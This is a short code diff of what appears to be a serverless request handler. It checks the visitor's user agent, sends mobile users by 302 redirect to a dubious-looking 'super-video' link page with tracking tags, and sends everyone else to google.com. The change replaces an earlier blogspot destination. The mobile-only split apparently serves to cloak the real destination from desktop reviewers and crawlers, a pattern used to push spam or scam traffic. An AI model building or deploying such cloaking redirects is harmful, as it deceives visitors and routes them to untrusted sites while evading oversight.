@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://waseey.blogspot.com/?utm_source=amsh&utm_medium=ansh", 302);
+    return Response.redirect("https://super-video.link24xx.com/links.html?utm_source=suny&utm_medium=suny", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
